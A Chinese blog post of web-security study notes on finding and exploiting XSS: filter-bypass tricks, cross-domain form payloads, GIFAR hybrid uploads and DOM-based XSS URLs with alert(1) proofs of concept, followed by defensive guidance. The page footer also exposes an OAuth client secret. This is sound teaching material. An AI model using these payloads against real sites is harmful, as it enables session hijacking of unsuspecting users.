+<li><p>将攻击扩展到其他应用程序页面<br>设计一个可以通过应用程序的某个区域中的XSS漏洞传送，并且在用户的浏览器中持续存在的攻击有效载荷，就可以攻破同一个域中的目标数据或功能。要实现上面的功能，一个简单的办法是创建一个包含整个浏览器窗口的iframe，然后在该iframe中重新加载当前页面。在用户浏览站点并登录到通过验证的区域时，注入的脚本将始终在顶层窗口中运行，这样，攻击者就能够钩住子iframe中的导航事件和表单提交，监视iframe中显示的所有响应内容，当然也能够在适当的时候劫持用户会话。在支持HTML5的浏览器中，当用户在页面间移动时，脚本甚至可以使用<font color="#fb8c00">window.history.pushStack()</font>函数在地址栏设置适当的URL。</p>
+</li>
+<li><p>修改请求方法<br>有时，把使用GET方法的攻击转换成POST方法的攻击可能会避开某些过滤。</p>
+</li>
+<li><p>通过cookie利用XSS漏洞<br>一些应用程序包含反射型XSS漏洞，攻击这种漏洞的进入点在请求的cookie中。在这种情况下，可以利用各种技巧来利用这种漏洞：</p>
+</li>
+</ol>
+<ul>
+<li>和修改请求一样，应用程序可能允许你使用与cookie同名的URL或请求参数来触发漏洞。</li>
+<li>如果应用程序包含任何可用于直接设置cookie值的功能(例如，基于提交参数值设置cookie的首选项页面)，则你可以设计一个跨站点请求伪造攻击，在受害者的浏览器中设置所需的cookie。然后，再诱使受害者提出以下两个请求：其中一个请求用于设置包含XSS有效载荷所需的cookie，另一个请求则用于请求以危险的方式处理cookie值的功能。</li>
+<li>人们已经在浏览器扩展技术(如Flash)中发现各种漏洞，这使攻击者可以使用任意HTTP消息头提交跨域请求。因此，可以利用浏览器插件中的某个这种类型的漏洞来提交跨域请求，在其中包含任意旨在触发漏洞的cookie消息头</li>
+<li>如果上述方法都无法成功实施攻击，你可以利用相同(或相关)域中的任何其他反射型XSS漏洞使用所需值设置一个永久性cookie，持续对受害者用户进行攻击</li>
+</ul>
+<ol start="4">
+<li><p>通过Referer消息头利用XSS漏洞<br>一些应用程序包含之只能通过Referer消息头触发的XSS漏洞。利用受他们控制的Web服务器，攻击者可以相当轻松地利用这些漏洞。例如，攻击者可以诱使受害者请求他们的服务器上的URL，该URL中包含针对易于攻击的应用程序的适当XSS有效载荷。然后，攻击者的服务器将返回一个响应，以请求上述URL，而攻击者的有效载荷就包含在此请求的Referer消息头中。<br>在某些情况下，只有在Referer消息头中包含与易受攻击的应用程序同属一个域的URL时，XSS漏洞才会触发。这时，可以利用应用程序中任何重定向功能来实施攻击。为此，攻击者需要构建一个指向该重定向功能的URL，在其中包含XSS攻击的有效载荷，并使其重定向到易于攻击的URL。这种攻击能否成功，取决于该功能使用的重定向方法。以及当前浏览器在进行上述重定向时是否会更新Referer消息头。</p>
+</li>
+<li><p>通过非标准请求和响应内容利用XSS漏洞<br>越来越多的程序采用不包含传统的请求参数的Ajax请求，在此之前，请求通常包含XML和JSON格式的数据，或采用各种序列化方案，因此，针对这些请求的响应往往包含同种或其他格式的数据，而不是HTML。下面对如何使用XML数据格式来实施攻击。</p>
+</li>
+</ol>
+<ul>
+<li>传送跨域XML请求<br>使用HTML表单(将enctype属性设置为text/plain)可以在HTTP请求主体中跨域传送几乎任何数据。这将告诉浏览器按照以下方式处理表单参数：<br>a. 在请求中隔行传送每个参数<br>b. 使用等号分隔每个参数的名称和值<br>c. 不对参数的值进行任何URL编码<br>上述行为意味着，只要数据中至少包含一个等号，就可以在消息主体中传送任意数据。为此，你需要将数据分隔成两块，等号前一块，等号后一块。然后，将第一块数据放在参数名称后，将第二块数据放在参数值中，这样，浏览器在构建请求时，它会传送以等号分隔的两块数据，因而 实际上构建了所需的数据。<br>由于XML在起始的XML标签的version属性中始终至少包含一个等号，因此，我们可以在消息主体中使用这种技巧跨域传送任意数据。<br>例如，如所需的XML如下所示：<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version<span class="token operator">=</span><span class="token string">"1.0"</span>?<span class="token operator">></span><span class="token operator">&lt;</span>data<span class="token operator">></span><span class="token operator">&lt;</span>param<span class="token operator">></span>foo<span class="token operator">&lt;</span>/param<span class="token operator">></span><span class="token operator">&lt;</span>/data<span class="token operator">></span></code></pre>
+则可以使用以下表单发送这些数据：<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>form enctype<span class="token operator">=</span><span class="token string">"text/plain"</span> action<span class="token operator">=</span><span class="token string">"http://wahh-app.com/ vuln.php"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">'&lt;?xml version'</span> value<span class="token operator">=</span><span class="token string">'"1.0"?>&lt;data>&lt;param>foo&lt;/param>&lt;/data>'</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>/form<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>document.forms<span class="token punctuation">[</span>0<span class="token punctuation">]</span>.submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
+要在param参数的值中包含常用的攻击字符，如标签尖括号，你需要在XML请求中对这些字符进行HTML编码。因此，在生成该请求的HTML表单中，需要对它们进行双重HTML编码。<br>在使用这些技巧时，唯一需要注意的地方是，生成的请求将包的含以下消息头：<pre class=" language-bash"><code class="language-bash">Content-Type: text/plain</code></pre>
+正常情况下，根据生成请求的具体方式，最初的请求本应包含在一个不同的Content-Type消息头，如果应用程序接受提供Content-Type消息头并正常处理消息主体，则在设计有效的XSS攻击时就可以使用这种技巧。如果由于Content-Type消息头已被修改，应用程序无法正常处理请求，则可能就没有办法跨域传送适当的请求来触发类似的XSS的行为。</li>
+</ul>
+<p>如果在包含非标准内容的请求中确定了类似于XSS的行为，首先应迅速确定，将Content-Type改为text/plain之后，这种行为是否存在，如果这种行为不再存在，则不必继续尝试设计有效的XSS攻击。</p>
+<ol start="6">
+<li>在XML响应中执行JavaScript<br>如果可以成功构建能够成功执行脚本的响应，往往需要利用所注入的内容类型的特定语法特性。对于XML而言，可以使用XHTML的新命名空间，并使浏览器将该命名空间解析为HTML，从而达到执行脚本的目的。例如，在firefox处理以下响应时，注入的脚本得以执行：<pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 Ok
+Content-Type: text/xml
+Content-Length: 1098
+</code></pre>
+</li>
+</ol>
+<xml>
+<data>
+.....
+<a xmlns:a='http://www.w3.org/1999/xhtml'>
+<a:body onload='alert(1)'/></a>
+.....
+</data>
+</xml>
+```
+如果响应由浏览器直接处理，而不是通常处理响应的原始应用程序组件处理时，此攻击将取得成功。
+
+<h5 id="攻击浏览器XSS过滤器"><a href="#攻击浏览器XSS过滤器" class="headerlink" title="攻击浏览器XSS过滤器"></a>攻击浏览器XSS过滤器</h5><p>IE浏览器默认包含一个XSS过滤器，其他浏览器也通过插件的形式提供类似的功能。这些过滤器的工作方式基本类似：它们被动监视请求和响应，并使用各种规则来确定正在进行的潜在XSS攻击。一旦确定潜在攻击，就修改响应的某些部分来阻止这些攻击。下面我们将介绍IE的XSS过滤器。<br>IE的XSS过滤器核心功能如下：</p>
+<ul>
+<li>检查跨域请求中的每一个参数值，以确定注入JavaScript的可能尝试。它会根据一个常见攻击字符串的基于正则表达式的黑名单来检查这些值，从而完成这一任务</li>
+<li>如果发现潜在恶意的参数值，则检查响应，看其中是否包含相同的值。</li>
+<li>如果响应中出现该值，则会对响应进行净化，以防止任何执行任何脚本。例如，它会将&lt; script&gt;修改为&lt;#script&gt;<br>大体而言，IE XSS过滤器能够有效阻止利用XSS漏洞的标准攻击，从而为任何尝试这类攻击的攻击者设置了很大的障碍。但是，我们也可以利用这种过滤器的工作机制来实施通过别的方法无法实施的其他攻击。下面是一些避开该过滤器的方法：</li>
+<li>该过滤器只检查参数值，而不检查参数名称。一些应用程序易于受到针对参数名称的攻击，如在响应中回显请求的整个URL或整个查询字符串。该过滤器无法阻止这类攻击。</li>
+<li>该过滤器单独检查每个参数的值。但是，如果在同一个响应中反射多个参数，就可以将攻击从一个参数传递到另一个参数(如用于突破长度限制的极其中所述)。如果可以将XSS有效载荷分隔成几块，则其中任何一块都不会与受阻止的表达式黑名单相匹配，这样，过滤器就无法阻止攻击。</li>
+<li>由于性能原因，过滤器仅检查跨域请求。因此，攻击者能够事用户向XSS URL提出“本地”请求，过滤器将无法阻止这种攻击。通常，如果应用程序包含任何行为，允许攻击者在由其他用户查看的页面中注入任意链接，这种攻击即成为可能(虽然这本身也属于反射型攻击，但XSS过滤器仅尝试阻止注入的脚本，而不是注入的链接)。在这种情况下，攻击者需要完成两个步骤：在用户的页面中注入恶意链接；用户单击链接并收到有效的XSS有效载荷。</li>
+</ul>
+<h3 id="查找并利用保存型XSS漏洞"><a href="#查找并利用保存型XSS漏洞" class="headerlink" title="查找并利用保存型XSS漏洞"></a>查找并利用保存型XSS漏洞</h3><p>测试保存型XSS漏洞时能够采用的一些特殊技巧如下</p>
+<h4 id="在Web邮件应用程序中测试XSS"><a href="#在Web邮件应用程序中测试XSS" class="headerlink" title="在Web邮件应用程序中测试XSS"></a>在Web邮件应用程序中测试XSS</h4><p>要测试这种功能，应该在该应用程序上创建自己的电子邮件账户，并通过电子邮件向自己实施大量XSS攻击，然后在该应用程序中查看每封邮件，确定是否有任何攻击取得成功。为彻底完成这一任务，你需要通过电子邮件发送各种反常的HTML内容(如我们在测试避开输入过滤的方法中所述)。如果仅限于使用标准电子邮件客户端，你会发现，无法完全控制原始的邮件内容，或者邮件客户端可能会净化或“清除”你有意设计的畸形语法。<br>在这种情况下，最好是采用其他方法来生成电子邮件，以便于直接控邮件的内容。一种方法是使用UNIX sendmail命令。首先，需要使用应当用于向外发送电子邮件的邮件服务器的详细信息配置电脑；然后，可以在文本编辑器中创建原始的电子邮件，并使用以下命令发送该邮件：</p>
+<pre class=" language-bash"><code class="language-bash">sendmail -t test@example.org <span class="token operator">&lt;</span> email.txt</code></pre>
+<p>以下为原始电子邮件文件的一个示例。在消息主体中测试各种XSS有效载荷和避开过滤的机制时，也可以尝试指定不同的Content-Type和charset：</p>
+<pre class=" language-bash"><code class="language-bash">MIME-Version: 1.0
+From: test@example.org
+Content-Type: text/html<span class="token punctuation">;</span> charset<span class="token operator">=</span>us-ascii
+Content-Transfer-Encoding: 7bit
+Subject: XSS <span class="token function">test</span>
+
+<span class="token operator">&lt;</span>html<span class="token operator">></span>
+<span class="token operator">&lt;</span>body<span class="token operator">></span>
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span>``onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>/body<span class="token operator">></span>
+<span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre>
+<h4 id="在上传文件中测试XSS"><a href="#在上传文件中测试XSS" class="headerlink" title="在上传文件中测试XSS"></a>在上传文件中测试XSS</h4><p>如果应用程序允许用户上传可被其他用户下载并查看的文件，就会出现保存型XSS。应用程序是否易于受到上传文件的攻击，取决于许多影响因素：</p>
+<ul>
+<li>在文件上传的过程中，应用程序可能会限制可以上传的文件的扩展名</li>
+<li>在文件上传的过程中，应用程序可能会检查文件内容，以确认其是否为所需的格式，如JPEG</li>
+<li>在文件下载过程中，应用程序可能会返回Content-Type消息头，以指定文件所包含的内容类型，如image/jpeg。</li>
+<li>在文件下载的过程中，应用程序可能会返回Content-Disposition消息头，以指定浏览器应将文件保存到磁盘上。否则，对于相关的内容类型，应用程序会处理并在用户的浏览器中显示文件。<br>在测试文件上传功能时，首先你应该尝试上传一个包含概念验证脚本的简单HTML文件。如果该文件被接受，则测试以正常方式下载该文件，如果应用程序按原样返回最初的文件，并且你的脚本得以执行，则应用程序肯定易于受到攻击。<br>如果应用程序阻止上传的文件，则尝试使用各种文件扩展名，包括.txt和.jpg。如果在你使用其他扩展名时，应用程序接受包含HTML的文件，则应用程序仍然可能易于受到攻击。攻击者可以发送包含诱惑性图像附件的电子邮件，如果用户查看该附件，他们的会话将被攻破。</li>
+</ul>
+<h5 id="混合文件攻击"><a href="#混合文件攻击" class="headerlink" title="混合文件攻击"></a>混合文件攻击</h5><p>通常，为了防范以上攻击，应用程序会对上传的文件内容执行某种确认，以确保其确实包含所需格式的数据，如图像。但是，使用“混合文件”(在一个文件中组合两种不同的格式)仍然可以对这些应用程序实施攻击。</p>
+<p>Billy Rios设计的GIFAR文件就是一种常见的混合文件。GIFAR文件包含GIF图像格式和JAR(java档案)格式的数据，并且是这两种格式的有效实例。这是因为，与GIF格式相关的文件元数据位于文件的开始部分，与JAR格式相关的元数据位于文件的末尾部分。因此，如果应用程序允许包含GIF数据的文件，那么，在确认上传内容时，该文件也会接受GIFAR文件。</p>
+<p>通常，使用GIFAR文件实施的上传文件攻击由以下步骤组成：</p>
+<ul>
+<li>攻击者发现由一名用户上传的GIF文件可由其他用户下载(如社交网络应用程序中的用户头像)的应用程序功能</li>
+<li>攻击者构建一个GIFAR文件，在其中包含一段Java代码，用于劫持任何执行该代码的用户的会话</li>
+<li>攻击者将他文件作为他的头像上传。因为其中包含有效的GIF图像，应用程序将接受该图像</li>
+<li>攻击者确定利用上传的文件对其实施攻击的适当外部网站。该网站可能为攻击者自己的网站，或允许其他用户创建任意HTML(如博客)的第三方站点。</li>
+<li>在该外部网站上，攻击者使用&lt; applet&gt;和&lt; object&gt;标签从上述社交网络站点以Java applet的形式上传GIFAR文件。</li>
+<li>如果用户访问该外部站点，攻击者的java applet将在其浏览器中执行。与包含正常脚本的文件不同，在遇到java applet时，同源策略的执行方式会不同。java applet将被视为属于加载它的域，而不是调用它的域。因此，攻击者的applet将在社交网络应用程序的域中执行。如果受害用户在受到攻击时已经登录该社交网络应用程序，或者曾登录该应用程序并选中了“保持登录状态”选项，则攻击者的applet将可以完全控制受害用户的会话，从而入侵该用户。</li>
+</ul>
+<p>当前java浏览器插件通过确认所加载的JAR是否包含混合内容，从而组织了这种使用GIFAR文件的特殊攻击。但是，使用混合文件隐藏可执行文件的原理仍然适用。攻击者或许可以以其他格式，或在将来通过其他方式实施类似的攻击。</p>
+<h5 id="在通过Ajax上传的文件中测试XSS"><a href="#在通过Ajax上传的文件中测试XSS" class="headerlink" title="在通过Ajax上传的文件中测试XSS"></a>在通过Ajax上传的文件中测试XSS</h5><p>一些应用程序使用Ajax来检索和呈现在片段标识符之后指定的URL。例如，应用程序的主页可能包含以下链接：</p>
+<pre class=" language-bash"><code class="language-bash">http://wahh-app.com/<span class="token comment" spellcheck="true">#profile</span></code></pre>
+<p>当用户单击该链接时，客户端脚本将处理单击事件，使用Ajax来检索在片段标识符之后显示的文件，并在现有的页面中的&lt; div&gt;元素中的innerHtml中设置响应。这样可提供无缝的用户体验，因为单击用户界面中的选项卡将更新所显示的内容，而无须重新加载整个页面。<br>在这种情况下，如果应用程序还包含其他允许上传和下载图像文件(如用户头像)的功能，你就可以上传一个包含嵌入式HTML标记的有效图像文件，并构建以下URL，使客户端代码提取该图像并将其作为HTML显示。</p>
+<pre class=" language-bash"><code class="language-bash">http://wahh-app.com/<span class="token comment" spellcheck="true">#profiles/#images/15234917624.jpg</span></code></pre>
+<p>HTML可以嵌入到有效图像文件的各种位置，包括图像的注释部分。一些浏览器，包括firefox，乐于将图像文件以HTML的格式显示。图像二进制部分将显示为乱码，而任何嵌入的HTML将正常显示。</p>
+<h3 id="查找并利用基于DOM的XSS漏洞"><a href="#查找并利用基于DOM的XSS漏洞" class="headerlink" title="查找并利用基于DOM的XSS漏洞"></a>查找并利用基于DOM的XSS漏洞</h3><p>提交一个特殊字符串作为每个参数，然后监控响应中是否出现该字符串的方法无法确定基于DOM的XSS漏洞。确定基于DOM的XSS漏洞的基本方法是：用浏览器手动浏览应用程序，并修改每一个URL参数，在其中插入一个标准测试的字符串，如：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token string">"&lt;script>alert(1)&lt;/script>
+"</span><span class="token punctuation">;</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span>//
+<span class="token string">'-alert(1)-'</span></code></pre>
+<p>通过在浏览器中显示每一个返回的页面，可以执行所有客户端脚本，并在必要时引用经过修改的URL参数。只要包含cookie的对话框出现，就说明发现了一个漏洞(可能基于DOM或其他类型的XSS漏洞)。使用本身提供JavaScript解释器的工具甚至可以自动完成这个过程。但是，由于注入有效JavaScript所需的准确语法取决于用户可控制字符串插入点前后已经存在的语法。所以这种基本方法并不能确定所有基于DOM的XSS漏洞。</p>
+<p>另一种更有效的方法，是检查所有客户端JavaScript，看其中是否使用了任何可能会导致漏洞的DOM属性。有大量工具可用于自动完成这个测试过程。其中一个有用的工具为DOMTracer。</p>
+<h4 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h4><p>以下是几种专门针对基于DOM的XSS漏洞的技巧可用于帮助攻击有效载荷避开服务器端确认：</p>
+<ul>
+<li><p>当客户端脚本从URL中提取参数值时，它们很少将查询字符串正确解析成名/值对。相反，它们通常会在URL中搜索后面紧跟着等号(=)的参数名称，然后提取出等号以后直到URL结束位置的内容。这种行为能够以两种方式加以利用：</p>
+</li>
+<li><p>如果服务器根据每个参数而不是整个URL应用确认机制，那么可以将有效载荷插入到附加在易受攻击的参数后面的一个虚构的参数中，如：</p>
+<pre class=" language-bash"><code class="language-bash">http://mdsec.net/error/76/Error.ashx?message<span class="token operator">=</span>Sorry%2d+an+error+occurred<span class="token operator">&amp;</span>foo<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
+<p>这时，虚构的参数被服务器忽略，因此不会受到任何过滤。但是，因为客户端脚本在查询字符串中搜索message=，并提取其后的全部内容，所以它处理的字符串中正好包含该有效载荷。</p>
+</li>
+<li><p>如果服务器对整个URL而不仅仅是消息参数应用确认机制，仍然有可能将有效载荷插入到HTML片段字符#的右边，从而避开过滤。例如：</p>
+<pre class=" language-bash"><code class="language-bash">http://mdsec.net/error/76/Error.ashx?message<span class="token operator">=</span>Sorry%2c+an+error+occurred<span class="token comment" spellcheck="true">#&lt;script>alert(1)&lt;/script></span></code></pre>
+<p>这时，片断字符串仍然属于URL的一部分，因此被保存在DOM中，并由易受攻击的客户端处理。但是，由于浏览器并不将URL中的片断部分提交给服务器，因此攻击字符串不会传送到服务器中，因而不会被任何服务器端过滤所阻止。因为客户端脚本提取message=后的所有内容，所以有效载荷仍然被复制到HTML页面源码中。</p>
+</li>
+</ul>
+<p>一些应用程序采用更加复杂的客户端脚本，对查询字符串进行更加严格的解析。例如，它在URL中搜索后面紧跟着等号的参数名称，然后提取等号后面的内容，直到遇到一个分隔符，如&amp;或#。在这种情况下，可以对前面的两个攻击进行如下修改：</p>
+<pre class=" language-bash"><code class="language-bash">http://mdsec.net/error/76/Error.ashx?foomessage<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&amp;</span>message<span class="token operator">=</span>Sorry%2c+an+error+occurred
+http://mdsec.net/error/76/Error.ashx?<span class="token comment" spellcheck="true">#message=&lt;script>alert(1)&lt;/script></span></code></pre>
+<p>在这两个示例中，第一个message=后面紧跟着攻击字符串，其中没有任何干扰脚本执行的分隔符，因此攻击有效载荷将得到处理，且被复制到HTML页面的源代码中。</p>
+<h2 id="防止XSS攻击"><a href="#防止XSS攻击" class="headerlink" title="防止XSS攻击"></a>防止XSS攻击</h2><h3 id="防止反射型和保存型XSS漏洞"><a href="#防止反射型和保存型XSS漏洞" class="headerlink" title="防止反射型和保存型XSS漏洞"></a>防止反射型和保存型XSS漏洞</h3><p>用户可控制的数据未经适当的确认与净化就被复制到应用程序中，这时造成反射型与保存型XSS的根本原因。由于数据被插入到一个HTML页面的源码中，恶意数据就会干扰这个页面，不仅修改这个内容，还会破坏它的结构(影响引用字符串、起始与结束标签、注入脚本等)。<br>为消除反射型和保存型XSS漏洞，首先必须确认应用程序中用户可控制的数据被复制到响应中的每一种情形。这包括从当前请求中复制的数据以及用户之前输入的保存在应用程序中的数据，还有通过带外通道输入的数据。为确保每一种情形，除仔细审查应用程序的全部源代码外，没有其他更好的办法。</p>
+<p>确定可能存在XSS风险、需要适当进行防御的操作后，需要采取一种三重防御方法阻止漏洞的发生。这种方法由以下3种因素组成：</p>
+<ul>
+<li>确认输入</li>
+<li>确认输出</li>
+<li>消除危险的插入点</li>
+</ul>
+<p>如果应用程序需要允许用户以HTML格式创建格式内容(如允许在注释中使用HTML的博客应用程序)。应谨慎使用这种方法。</p>
+<h4 id="确认输入"><a href="#确认输入" class="headerlink" title="确认输入"></a>确认输入</h4><p>如果应用程序在某个位置收到的用户提交的数据将来可能被复制到它的响应中，应用程序应对根据这种情形对这些数据进行严格的确认。可能需要确认的数据的特性包含以下几点：</p>
+<ul>
+<li>数据不是太长</li>
+<li>数据仅包含某组合法字符</li>
+<li>数据与一个特殊的正则表达式匹配</li>
+</ul>
+<h4 id="确认输出"><a href="#确认输出" class="headerlink" title="确认输出"></a>确认输出</h4><p>如果应用程序将某位用户或第三方提交的数据复制到它的响应中，那么应用程序应对这些数据进行HTML编码，以净化可能的恶意字符。HTML编码指用对应的HTML实体替代字面量字符。这样做可以确保浏览器安全处理可能为恶意的字符，把它们当作HTML文档的内容而非结构处理。一些经常造成问题的字符的HTML编码如下：</p>
+<ul>
+<li>“—&amp;quot ;</li>
+<li>‘—&amp;apos ;</li>
+<li>&amp;—&amp;amp ;</li>
+<li>&lt;—&amp;lt ;</li>
+<li><blockquote>
+<p>—&amp;gt ;<br>除这些常用的编码外，实际上，任何字符都可以用它的数字ASCII字符代码进行HTML编码。为尽可能确保安全，开发者可能会选择HTML编码每个非字母数字字符，包括空白符。这种方法通常会显著增加应用程序的工作压力。同时给任何尝试避开过滤的攻击设置巨大障碍。在输入和输出防御中，输出确认更为重要，必不可少。<br>在设计输入和输出确认机制时，尤其要注意的是，应在实施规范化后再对数据进行过滤和编码，而且之后不得对数据实施进一步的规范化。应用程序还必须保证其中存在的空字节不会对它的确认造成任何干扰。</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="消除危险的插入点"><a href="#消除危险的插入点" class="headerlink" title="消除危险的插入点"></a>消除危险的插入点</h4><p>应用程序页面中有一些位置，在这里插入用户提交的输入就会造成极大的风险。</p>
+<ul>
+<li>应尽量避免直接在现有的JavaScript中插入用户可控制的数据。这适用于<Script>标签中的代码，也适用于事件处理器代码。如果应用程序尝试以安全的方式在其中插入数据，可能就会使攻击者有机会避开它们实施的防御性过滤.</li>
+<li>如果标签属性接受URL作为它的值，通常应用程序应该避免嵌入用户输入，因为各种技巧也能引入脚本代码，包括伪协议脚本处理的使用</li>
+<li>如果攻击者通过插入一个相关指令，或者因为应用程序使用一个请求参数指定首选的字符集，因而能够控制应用程序的编码类型，那么这些情况也应该给加以避免。在这种情况下，输入确认和输出确认会失效，因为攻击者的输入进行了不常见的编码，以致于上述过滤并不将其视为恶意输入。只要有可能，应用程序应该在它的响应消息头中指定该一种编码类型，并禁止对它进行修改，并确保应用程序的XSS过滤与其兼容，如：<pre class=" language-bash"><code class="language-bash">Content-Type: text/html<span class="token punctuation">;</span> charset<span class="token operator">=</span>ISO-8859-1<span class="token punctuation">;</span></code></pre>
+</li>
+</ul>
+<h4 id="允许有限的HTML"><a href="#允许有限的HTML" class="headerlink" title="允许有限的HTML"></a>允许有限的HTML</h4><p>一些应用程序允许用户以HTML的格式提交即将插入到应用程序响应中的数据。为安全地支持这种功能，应用程序应保持稳健，仅允许有限的HTML子集，避免提供任何引入脚本的方法。有各种框架(如OWASP AntiSamy项目)可用于确认用户提交的HTML标记，以确保其中不包含任何执行JavaScript的方法。建议需要允许用户创建有限HTML的开发者直接使用某个成熟的框架。或许，也可以采用某种定制的中间标记语言，允许用户使用有限的中间标记语言语法，然后由应用程序对其进行处理，以生成相应的HTML标记。</p>
+<h3 id="防止基于DOM的XSS漏洞"><a href="#防止基于DOM的XSS漏洞" class="headerlink" title="防止基于DOM的XSS漏洞"></a>防止基于DOM的XSS漏洞</h3><p>我们上述的防御机制并不能防止基于DOM的XSS漏洞，因为造成这种漏洞并不需要将用户可控制的数据复制到服务器的响应中。</p>
+<p>应用程序应尽量避免使用客户端脚本处理DOM数据并把它插入到页面中，由于被处理的数据不在服务器的直接控制范围内，有时甚至不在它的可见范围内，因此这种行为存在着固定风险。</p>
+<p>如果无法避免要以这种方式使用客户端脚本，我们可以通过两种防御方法防止基于DOM的XSS漏洞，它们分别与前面的输入与输出确认相对应。</p>
+<h4 id="确认输入-1"><a href="#确认输入-1" class="headerlink" title="确认输入"></a>确认输入</h4><p>我们可以通过确认将要插入到文档中的数据仅包含字母数字字符与空白符，从而阻止攻击发生。除这种客户端控制之外，还可以在服务器端对URL数据进行确认，实施深层防御：</p>
+<ul>
+<li>参数个数检查</li>
+<li>参数大小写检查</li>
+<li>确认参数值仅包含数字字母<br>实施了这些控制后，客户端脚本还需对参数值进行解析，确保其中不包含任何URL片断字符。</li>
+</ul>
+<h4 id="确认输出-1"><a href="#确认输出-1" class="headerlink" title="确认输出"></a>确认输出</h4><p>在将用户可控制的DOM数据插入到文档之前，应用程序也可以对它们进行HTML编码。</p>
+
+            </div>
+            <hr/>
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>转载规则</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
+                </a>
+            </div>
+            <br/>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
+                    《Web安全(10)》
+                </span> 由
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/09/websecurity10/" property="cc:attributionName"
+               rel="cc:attributionURL">
+                fightingtree
+            </a> 采用
+            <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank">
+                知识共享署名 4.0 国际许可协议
+            </a>进行许可。
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'debc6373e622b493f954',
+        clientSecret: '5001da2e70b343177a3d07015d4478fd170b7037',
+        repo: 'fightingtree.github.io',
+        owner: 'fightingtree',
+        admin: "fightingtree",
+        id: '2019-11-09T13-51-17',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2019/11/11/websecurity11/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://pic.superbed.cn/item/5db3fa5b8b58bc7bf71e4f72.jpg" class="responsive-img" alt="Web安全(11)">
+                        
+                        <span class="card-title">Web安全(11)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            攻击用户(其他技巧)
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-11
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                    安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web/" target="_blank">
+                        <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%AE%89%E5%85%A8/" target="_blank">
+                        <span class="chip bg-color">安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/11/07/websecurity9/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://pic.superbed.cn/item/5db3fa5b8b58bc7bf71e4f75.jpg" class="responsive-img" alt="Web安全(9)">
+                        
+                        <span class="card-title">Web安全(9)</span>
+                    </div>
+                </a>
